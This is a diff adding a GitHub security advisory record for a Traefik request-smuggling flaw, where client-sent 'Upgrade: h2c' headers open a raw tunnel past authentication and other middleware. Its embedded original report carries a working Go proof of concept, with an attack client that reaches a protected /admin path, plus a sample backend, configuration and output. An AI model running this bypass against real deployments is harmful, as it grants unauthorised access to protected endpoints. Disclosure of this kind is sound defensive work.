@@ -1,0 +1,88 @@
+{
+  "id": "GHSA-w4v4-9rw7-5326",
+  "modified": "2026-09-10T23:15:04.347944883Z",
+  "published": "2026-09-10T23:04:37Z",
+  "aliases": [
+    "CVE-2026-88008"
+  ],
+  "summary": "Traefik: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') and Incorrect Authorization",
+  "details": "## Summary\n\nThere is a high-severity request-smuggling vulnerability in Traefik's handling of the HTTP/1.1 `Upgrade` mechanism. Since Traefik moved to unencrypted HTTP/2 with prior knowledge (Go 1.24), a client-initiated `Upgrade: h2c` request header and its connection-specific `HTTP2-Settings` header were forwarded to the backend. A backend that honours the h2c upgrade and answers `101 Switching Protocols` puts Traefik into a raw byte tunnel that bypasses the router and the entire middleware chain (authentication, IPAllowList, rate limiting) on a shared backend. The fix stops forwarding the `Upgrade: h2c` token and the `HTTP2-Settings` header; `Upgrade: websocket` is unaffected. Exploitation requires a backend that upgrades h2c without validating the `Connection` listing; common off-the-shelf servers were not exploitable in testing.\n\nTraefik v3.4.2 through v3.6 are end-of-life and are also affected; users on those versions must upgrade to v3.7.13.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.57\n- https://github.com/traefik/traefik/releases/tag/v3.7.13\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n\u003cdetails\u003e\n\u003csummary\u003eOriginal Description\u003c/summary\u003e\n\n# Summary\n\nTraefik's default HTTP reverse proxy forwards arbitrary `Connection: Upgrade` / `Upgrade: \u003ctoken\u003e` requests to the backend. Upgrade tokens are not restricted to protocols explicitly supported by Traefik.\n\nThis is exploitable when a backend accepts a non-WebSocket upgrade such as `h2c` and responds with `101 Switching Protocols`. Traefik then switches the connection into a raw byte tunnel and stops applying the HTTP routing/middleware chain.\n\nAn attacker can abuse an unprotected router pointing to the backend to establish the tunnel, then send HTTP/2 requests to other paths on the same backend. Those requests bypass the Traefik router and are therefore not subject to middleware attached to the corresponding protected route.\n\nFor example:\n\n```text\n/public                         /admin\n(no auth)                       (BasicAuth)\n    |                               |\n    +----------- same backend ------+\n                    ^\n                    |\n              h2c tunnel\n                    |\n                 attacker\n```\n\nThis allows middleware such as `BasicAuth`, `ForwardAuth`, `IPAllowList`, and `RateLimit` to be bypassed. Requests sent over the tunnel also bypass Traefik's normal access logging, metrics, and tracing.\n\nThe core issue is **unrestricted client-initiated protocol upgrades combined with loss of the HTTP routing/middleware layer after `101 Switching Protocols`**.\n\n# Technical Details\n\nThe default proxy implementation is `pkg/proxy/httputil` (the fast proxy remains experimental and is disabled by default).\n\nThe relevant request path is:\n\n* `pkg/middlewares/forwardedheaders/forwarded_header.go` (`removeConnectionHeaders`, ~lines 198-234)\n\n  When `Connection: Upgrade` is present, the `Upgrade` header is preserved and forwarded downstream. There is no validation that the upgrade token is `websocket`.\n\n* `pkg/proxy/httputil/proxy.go` (`isWebSocketUpgrade`, ~line 170)\n\n  WebSocket receives special header handling through `cleanWebSocketHeaders`, but this is not an allowlist. Other upgrade protocols are still passed through.\n\n* `pkg/server/service/smart_roundtripper.go` (`RoundTrip`, ~line 56)\n\n  Requests containing `Connection: Upgrade` are sent to the backend over HTTP/1, allowing the backend to perform the upgrade.\n\n* `net/http/httputil.ReverseProxy`\n\n  When the backend returns `101 Switching Protocols`, the reverse proxy switches to tunnel mode and copies bytes between the client and backend.\n\nThe security boundary breaks at this point.\n\nThe Traefik router and middleware chain are selected only for the initial HTTP/1 request. After the backend returns `101`, Traefik no longer parses the connection as HTTP requests and does not re-run routing or middleware for subsequent HTTP/2 streams.\n\nThe resulting flow is:\n\n```text\nAttacker\n   |\n   | GET /public\n   | Connection: Upgrade\n   | Upgrade: h2c\n   v\nTraefik\n   |\n   | r-public (no auth)\n   v\nBackend\n   |\n   | 101 Switching Protocols\n   v\n[raw byte tunnel]\n   |\n   | HTTP/2 GET /admin\n   v\nBackend\n```\n\nThe `/admin` request never reaches the `/admin` router. It is sent directly to the backend over the existing tunnel.\n\nI found no upgrade-token allowlist or `h2c` rejection in the relevant proxy path.\n\n## This is distinct from configured h2c support\n\nTraefik already supports explicitly configured h2c backends. In that case, the operator opts into HTTP/2 communication through the `h2c://` service scheme / `transportH2C` configuration.\n\nThis issue is different.\n\nThe upgrade is initiated by the client through the `Upgrade` header. Traefik forwards it regardless of whether the operator configured h2c for that backend.\n\nTherefore, a plain HTTP/1 backend can still be affected if it happens to accept `Upgrade: h2c` and return `101`. The protocol switch is initiated by the client, and Traefik does not gate it.\n\n# PoC\n\nReproduced against a Traefik binary built from master at commit `9bb0e55`:\n\n```text\ngo build ./cmd/traefik\nGo 1.26.4\n```\n\nDefault configuration was used, with no `encodedCharacters` or upgrade-related options enabled.\n\n## 1. Backend\n\nThe backend implements a minimal HTTP/1.1 → h2c upgrade handler.\n\nIt exposes:\n\n* `/public` — unauthenticated\n* `/admin` — intended to be protected by Traefik\n\n```go\npackage main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"net\"\n    \"net/http\"\n    \"strings\"\n\n    \"golang.org/x/net/http2\"\n)\n\nfunc main() {\n    mux := http.NewServeMux()\n\n    mux.HandleFunc(\"/public\", func(w http.ResponseWriter, r *http.Request) {\n        fmt.Fprintf(w, \"public ok\\n\")\n    })\n\n    mux.HandleFunc(\"/admin\", func(w http.ResponseWriter, r *http.Request) {\n        fmt.Fprintf(\n            w,\n            \"ADMIN SECRET DATA (proto=%s path=%s)\\n\",\n            r.Proto,\n            r.URL.Path,\n        )\n    })\n\n    h2s := \u0026http2.Server{}\n\n    ln, _ := net.Listen(\"tcp\", \"127.0.0.1:9900\")\n\n    for {\n        c, err := ln.Accept()\n        if err != nil {\n            return\n        }\n\n        go func(conn net.Conn) {\n            br := bufio.NewReader(conn)\n            var sb strings.Builder\n\n            for {\n                line, err := br.ReadString('\\n')\n                if err != nil {\n                    return\n                }\n\n                sb.WriteString(line)\n\n                if line == \"\\r\\n\" {\n                    break\n                }\n            }\n\n            if strings.Contains(sb.String(), \"Upgrade: h2c\") {\n                conn.Write([]byte(\n                    \"HTTP/1.1 101 Switching Protocols\\r\\n\" +\n                        \"Connection: Upgrade\\r\\n\" +\n                        \"Upgrade: h2c\\r\\n\\r\\n\",\n                ))\n\n                h2s.ServeConn(conn, \u0026http2.ServeConnOpts{\n                    Handler: mux,\n                })\n\n                return\n            }\n\n            conn.Close()\n        }(c)\n    }\n}\n```\n\n## 2. Traefik configuration\n\n`traefik.yml`:\n\n```yaml\nentryPoints:\n  web:\n    address: \"127.0.0.1:9080\"\n\nproviders:\n  file:\n    filename: \"dynamic.yml\"\n```\n\n`dynamic.yml`:\n\n```yaml\nhttp:\n  routers:\n    r-public:\n      rule: \"PathPrefix(`/public`)\"\n      entryPoints: [\"web\"]\n      service: svc\n\n    r-admin:\n      rule: \"PathPrefix(`/admin`)\"\n      entryPoints: [\"web\"]\n      service: svc\n      middlewares: [\"adminauth\"]\n\n  middlewares:\n    adminauth:\n      basicAuth:\n        users:\n          - \"admin:$2a$10$J33WYF/FCnoWm7PPeEG7leme9d.MioVmaTgJ49MemNXJtdbEyqfs.\"\n\n  services:\n    svc:\n      loadBalancer:\n        servers:\n          - url: \"http://127.0.0.1:9900\"\n```\n\nBoth routers terminate on the same backend. Only `/admin` has authentication.\n\n## 3. Attacker\n\nThe PoC first verifies that `/admin` is protected, then establishes an unauthenticated `h2c` tunnel through `/public` and sends `/admin` over the resulting HTTP/2 connection.\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"io\"\n    \"net\"\n    \"net/http\"\n    \"strings\"\n    \"time\"\n\n    \"golang.org/x/net/http2\"\n)\n\nfunc main() {\n    front := \"127.0.0.1:9080\"\n\n    resp, _ := http.Get(\"http://\" + front + \"/admin\")\n    b, _ := io.ReadAll(resp.Body)\n    resp.Body.Close()\n\n    fmt.Printf(\n        \"[1] Direct GET /admin (no creds) -\u003e %d %q\\n\",\n        resp.StatusCode,\n        strings.TrimSpace(string(b)),\n    )\n\n    raw, _ := net.Dial(\"tcp\", front)\n\n    raw.Write([]byte(\n        \"GET /public HTTP/1.1\\r\\n\" +\n            \"Host: x\\r\\n\" +\n            \"Connection: Upgrade, HTTP2-Settings\\r\\n\" +\n            \"Upgrade: h2c\\r\\n\" +\n            \"HTTP2-Settings: AAMAAABkAAQAoAAAAAIAAAAA\\r\\n\" +\n            \"\\r\\n\",\n    ))\n\n    buf := make([]byte, 256)\n\n    raw.SetReadDeadline(time.Now().Add(3 * time.Second))\n    n, _ := raw.Read(buf)\n\n    fmt.Printf(\n        \"[2] Upgrade: h2c to /public (no auth) -\u003e %q\\n\",\n        strings.SplitN(string(buf[:n]), \"\\r\\n\", 2)[0],\n    )\n\n    raw.SetReadDeadline(time.Time{})\n\n    cc, _ := (\u0026http2.Transport{}).NewClientConn(raw)\n\n    req, _ := http.NewRequest(\"GET\", \"http://x/admin\", nil)\n\n    r2, _ := cc.RoundTrip(req)\n    b2, _ := io.ReadAll(r2.Body)\n    r2.Body.Close()\n\n    fmt.Printf(\n        \"[3] HTTP/2 GET /admin over tunnel -\u003e %d %q\\n\",\n        r2.StatusCode,\n        strings.TrimSpace(string(b2)),\n    )\n}\n```\n\n### Result\n\n```text\n[1] Direct GET /admin (no creds)      -\u003e 401 \"401 Unauthorized\"\n[2] Upgrade: h2c to /public (no auth) -\u003e \"HTTP/1.1 101 Switching Protocols\"\n[3] HTTP/2 GET /admin over tunnel     -\u003e 200 \"ADMIN SECRET DATA (proto=HTTP/2.0 path=/admin)\"\n```\n\nThis demonstrates the bypass:\n\n* Direct `/admin` → `401`\n* Unauthenticated `/public` → `101`\n* `/admin` over the established h2c tunnel → `200`\n\nThe PoC therefore shows that the `/admin` middleware is enforced for normal requests but is completely bypassed once the attacker establishes the upgrade tunnel.\n\n# Impact\n\nThe issue is exploitable when:\n\n1. An attacker can reach a router without the relevant security middleware.\n2. That router points to the same backend as a protected router.\n3. The backend accepts `Upgrade: h2c` and returns `101 Switching Protocols`.\n4. Traefik allows the resulting upgrade to complete.\n\nUnder these conditions, an unauthenticated attacker can bypass middleware protecting other paths on the same backend.\n\nPotentially affected middleware includes:\n\n* `BasicAuth`\n* `ForwardAuth`\n* `IPAllowList`\n* `RateLimit`\n* header/security middleware\n* other per-request middleware attached to the protected router\n\nThe tunneled requests also bypass Traefik's normal request processing and therefore do not appear as individual requests in the normal access logs, metrics, or tracing pipeline.\n\nThe impact is therefore not limited to auth bypass. Depending on the backend, an attacker may reach internal/admin endpoints or perform operations that were intended to be protected by Traefik.\n\n# Scope / Preconditions\n\nThe backend must support the HTTP/1.1 → h2c upgrade mechanism and return `101 Switching Protocols`.\n\nThis is not true for every HTTP/2-capable backend.\n\nFor example, recent `golang.org/x/net/http2/h2c` implementations no longer support the HTTP/1.1 upgrade mechanism, so a current Go h2c server using that implementation is not necessarily affected.\n\nOlder implementations, non-Go servers, custom h2c handlers, and some gRPC-related stacks may still accept the upgrade.\n\nTherefore, this is **not** a generic \"Traefik + HTTP/2 backend = vulnerable\" issue. The backend's ability to accept the client-initiated upgrade is a required prerequisite.\n\nThe Traefik-side issue itself does not depend on the operator explicitly configuring h2c: the upgrade is client-initiated, forwarded by Traefik, and followed by a transition out of the HTTP routing/middleware path.\n\n# Suggested Fix\n\nThe proxy should only forward upgrade protocols explicitly supported and negotiated by Traefik, e.g. WebSocket.\n\nAt minimum, unsupported upgrade tokens should be rejected or stripped before forwarding upstream:\n\n```text\nUpgrade: h2c\nUpgrade: \u003carbitrary-token\u003e\n```\n\nMore generally, Traefik should not treat an arbitrary `101 Switching Protocols` response as sufficient to transition into a tunnel unless the requested upgrade protocol is explicitly supported by Traefik.\n\nThe relevant security property is:\n\n\u003e **A client must not be able to select an arbitrary protocol upgrade and thereby escape Traefik's HTTP routing/middleware layer.**\n\n# TL;DR\n\nTraefik forwards arbitrary client-supplied `Upgrade` tokens.\n\nIf a backend accepts `Upgrade: h2c` and returns `101`, Traefik switches the connection into a raw tunnel. HTTP/2 requests sent through that tunnel are no longer processed by Traefik's routers or middleware.\n\nAn attacker can therefore use an unprotected router to establish the tunnel and reach protected paths on the same backend:\n\n```text\n/public (no auth)\n      |\n      | Upgrade: h2c\n      v\n   Traefik\n      |\n      | 101\n      v\n  raw tunnel\n      |\n      | HTTP/2 GET /admin\n      v\n   Backend\n      |\n      v\n/admin\n(middleware bypassed)\n```\n\nIn the PoC, a direct unauthenticated request to `/admin` returns `401`, while the same endpoint accessed over the h2c tunnel returns `200`.\n\nThe root cause is **unrestricted client-initiated protocol upgrades combined with the loss of Traefik's HTTP routing/middleware enforcement after `101 Switching Protocols`.**\n\n\u003c/details\u003e\n---",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.4.2"
+            },
+            {
+              "fixed": "3.7.13"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-w4v4-9rw7-5326/GHSA-w4v4-9rw7-5326.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v2",
+        "purl": "pkg:golang/github.com/traefik/traefik/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "2.11.26"
+            },
+            {
+              "fixed": "2.11.57"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-w4v4-9rw7-5326/GHSA-w4v4-9rw7-5326.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/security/advisories/GHSA-w4v4-9rw7-5326"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-88008"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/pull/13797"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/commit/a277e94664ffc1ce9543df552d3bbf48d4d3b8b3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/traefik/traefik"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v2.11.57"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.7.13"
+    }
+  ]
+}
